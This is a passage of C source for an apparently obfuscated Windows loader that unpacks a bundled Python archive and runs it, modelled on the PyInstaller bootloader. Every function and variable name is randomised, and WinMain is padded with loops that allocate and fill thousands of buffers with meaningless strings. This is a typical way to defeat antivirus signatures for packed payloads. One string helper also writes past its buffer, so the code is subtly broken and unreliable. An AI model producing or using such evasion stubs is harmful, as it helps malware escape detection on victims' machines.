        biwTDyoztdf = PI_PyRun_SimpleString(yCWlfEGYEbqytT);
        if (biwTDyoztdf != 0) return biwTDyoztdf; free(yCWlfEGYEbqytT); }
    tPjuthrVmC = wrcJhMiz(uJeRUg, tPjuthrVmC);
} return 0; }
int DVMZOPo(ARCHIVE_STATUS *FOuOYephXp, char const * zFcmfwqptURDdtI, char  const * eiMRTedMAvt) {
if (RlpuIjuTj(FOuOYephXp, zFcmfwqptURDdtI, eiMRTedMAvt)) return -1;
if (dBDpwsNWoCtB(FOuOYephXp)) return -1;
return 0; }
int tKnYJxnM(ARCHIVE_STATUS *gRRSfecr, int argc, char *argv[]) {
int VIAXwF = 0;
if (YuMvTrDt(gRRSfecr)) return -1;
if (RYOEZpBQAsCI(gRRSfecr, argc, argv)) return -1;
if (hLxRlWyZgwpBX(gRRSfecr)) return -1;
if (sJmtXbOcO(gRRSfecr)) return -1;
VIAXwF = XktRuP(gRRSfecr);
return VIAXwF; }
void uVeIru(const char *eJbTOmQuiQZze);
void aVcDwV(char *fPoYVaKhHnKE, int oNbSvN, struct _finddata_t lsRFpxQm) {
if ( strcmp(lsRFpxQm.name, ".")==0  || strcmp(lsRFpxQm.name, "..") == 0 ) return;
fPoYVaKhHnKE[oNbSvN] = '\0';
strcat(fPoYVaKhHnKE, lsRFpxQm.name);
if ( lsRFpxQm.attrib & _A_SUBDIR ) uVeIru(fPoYVaKhHnKE);
 else if (remove(fPoYVaKhHnKE)) { Sleep(100); remove(fPoYVaKhHnKE); } }
void uVeIru(const char *ZHgLWtiAr) {
char YHdlXBl[_MAX_PATH+1]; struct _finddata_t XwAKOT;
long BPlKPxzixJBV; int hNnDFGgog; strcpy(YHdlXBl, ZHgLWtiAr);
hNnDFGgog = strlen(YHdlXBl);
if ( YHdlXBl[hNnDFGgog-1] != '/' && YHdlXBl[hNnDFGgog-1] != '\\' ) { strcat(YHdlXBl, "\\"); hNnDFGgog++; }
strcat(YHdlXBl, "*");
BPlKPxzixJBV = _findfirst(YHdlXBl, &XwAKOT);
if (BPlKPxzixJBV != -1) {
    aVcDwV(YHdlXBl, hNnDFGgog, XwAKOT);
    while ( _findnext(BPlKPxzixJBV, &XwAKOT) == 0 ) aVcDwV(YHdlXBl, hNnDFGgog, XwAKOT);
    _findclose(BPlKPxzixJBV); }
rmdir(ZHgLWtiAr); }
void oPnRONfxnwSAos(ARCHIVE_STATUS *toxBlVlC) { if (toxBlVlC->temppath[0]) uVeIru(toxBlVlC->temppath); }
int AnJrBG(ARCHIVE_STATUS *oZCGThof) { return ntohl(oZCGThof->cookie.pyvers); }
void iMRKSVsnci(void) { PI_Py_Finalize(); } 
char* oAuIqMENjWg(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\0'; return t2; }
char* ZohcFCBoAZPW(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\0'; return result; }
char* setwvc(){ char *PTiMyTUojAoBL = oAuIqMENjWg("KDBnoQNmmgWMbTPozVoQYEdngMtaoOHbirfuteGJuilXkZXSmb"); return strstr( PTiMyTUojAoBL, "M" );}
char* rKVffynfh() { char qDnpYACGCFu[7205] = "TVJwjiWfOGgqfgOkVTvqaqNudKGZAHRJxqjFHtaqbprYitCyQA"; char *lHSGfitTFHWOSyh = strupr(qDnpYACGCFu); return strlwr(lHSGfitTFHWOSyh); }
char* jlnwUOPWxwx(){ char QDrEemAl[7205], jcOJmf[7205/2]; strcpy(QDrEemAl,"dXewvtQRJlWmVMVNcwASztFSAWYXzKyrxPegHvaXrcyDDVzrHM"); strcpy(jcOJmf,"pLevDZrbGrynxWbuHIaSuTGIcrraXLMCvppHsduawnAdRKQkWU"); return ZohcFCBoAZPW(strcat( QDrEemAl, jcOJmf)); }
int APIENTRY WinMain( HINSTANCE mgVuVFg, HINSTANCE xqLJQNZBXtjIBsu, LPSTR CxXSNZTStVL, int PTtbiF ) {
int i = 0;
int argc = __argc;
char *vmrgZt = NULL;
char* Ioiubf[6323];
char* kWZDzrBM[9692];
char* pXknARMcIrEInRr[2554];
char **argv = __argv;
char HqORhCHPU[_MAX_PATH + 5];
char PHvhKUcyqxffs[_MAX_PATH];
WCHAR iFeYwOOoWxvyj[_MAX_PATH + 1];
char MEIPASS2[_MAX_PATH + 11] = "_MEIPASS2=";
ARCHIVE_STATUS *anmKPczLmbh[20];
char OUjzWo[_MAX_PATH];
int aSZhJsWUVOA = 0;
memset(&anmKPczLmbh, 0, 20 * sizeof(ARCHIVE_STATUS *));
for (i = 0;  i < 9692;  ++i) kWZDzrBM[i] = malloc (7757);if ((anmKPczLmbh[SELF] = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL){ return -1; }
TJsNyrJVzmEm(PHvhKUcyqxffs, argv[0]);
VfKVdJSbVtNoD(iFeYwOOoWxvyj);
for (i = 0;  i < 6323;  ++i) Ioiubf[i] = malloc (8085);AyRMSmztL(HqORhCHPU, PHvhKUcyqxffs);
yGQmeqNRGjnQ(OUjzWo, PHvhKUcyqxffs);
for (i = 0;  i < 2554;  ++i) pXknARMcIrEInRr[i] = malloc (7827);vmrgZt = getenv( "_MEIPASS2" );
if (vmrgZt && *vmrgZt == 0) { vmrgZt = NULL; }
if (DVMZOPo(anmKPczLmbh[SELF], OUjzWo, &PHvhKUcyqxffs[strlen(OUjzWo)])) {
    if (DVMZOPo(anmKPczLmbh[SELF], OUjzWo, &HqORhCHPU[strlen(OUjzWo)])) { return -1; } }
if (!vmrgZt && !hFUmQa(anmKPczLmbh)) {
    vmrgZt = OUjzWo;
    strcat(MEIPASS2, OUjzWo);
    putenv(MEIPASS2); }
if (vmrgZt) {
    if (strcmp(OUjzWo, vmrgZt) != 0) {
        strcpy(anmKPczLmbh[SELF]->temppath, vmrgZt);
        strcpy(anmKPczLmbh[SELF]->temppathraw, vmrgZt); }
    dzXGOfdQoJX(vmrgZt, PHvhKUcyqxffs);
for (i=0; i<9692; ++i){strcpy(kWZDzrBM[i], setwvc());}    aSZhJsWUVOA = tKnYJxnM(anmKPczLmbh[SELF], argc, argv);
    EassGiLlrepCN();
    iMRKSVsnci();
} else { 
    if (QLiGBEXwYnh(anmKPczLmbh)) { return -1; }
for (i=0; i<6323; ++i){strcpy(Ioiubf[i], rKVffynfh());}    strcat(MEIPASS2, anmKPczLmbh[SELF]->temppath[0] != 0 ? anmKPczLmbh[SELF]->temppath : OUjzWo);
    putenv(MEIPASS2);
    if (lkUjAnANcgqvAh(anmKPczLmbh[SELF]) == -1) return -1;
    aSZhJsWUVOA = UwfsEYT(iFeYwOOoWxvyj);
    if (anmKPczLmbh[SELF]->temppath[0] != 0) uVeIru(anmKPczLmbh[SELF]->temppath);
    for (i = SELF; anmKPczLmbh[i] != NULL; i++) { free(anmKPczLmbh[i]); }}
for (i=0; i<2554; ++i){strcpy(pXknARMcIrEInRr[i], jlnwUOPWxwx());}return aSZhJsWUVOA; }
